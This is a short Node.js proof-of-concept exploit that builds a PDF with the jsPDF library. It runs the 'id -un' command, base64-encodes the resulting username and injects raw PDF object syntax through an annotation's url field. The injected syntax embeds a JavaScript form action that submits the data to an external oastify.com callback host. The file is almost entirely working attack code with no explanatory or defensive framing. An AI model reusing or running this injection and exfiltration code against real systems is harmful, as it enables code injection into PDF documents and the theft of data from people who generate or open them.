const {jsPDF} = require("jspdf");
const {spawn} = require("child_process");
const doc = new jsPDF();

let result = "";
let encodedResult = "";

const ls = spawn("id", ["-un"]);

ls.stdout.on("data", data => {
  console.log(`stdout: ${data}`);
  result += data;
});

ls.on("close", () => {
  encodedResult = Buffer.from(result).toString("base64");
  console.log(`Encoded result: ${encodedResult}`);
  const url = `https://mrhr19qy2h55sn0lhl55l6cgh7nzbpze.oastify.com?result=${encodedResult}`;
  // Pass the URL to the submitForm method
  doc.createAnnotation({
    bounds: {x: 0, y: 10, w: 200, h: 200},
    type: 'link',
    url: `#)>>>><</Type/Annot/Rect[ 0 0 900 900]/Subtype/Widget/Parent<</FT/Tx/T(Abc)/V(blah)>>/A<</S/JavaScript/JS(
      app.alert(1);
      this.submitForm('${url}', false, false, ['Abc']);
    )/(`});
  doc.text(20, 20, 'Test text');
  doc.save("ssrf.pdf");
});
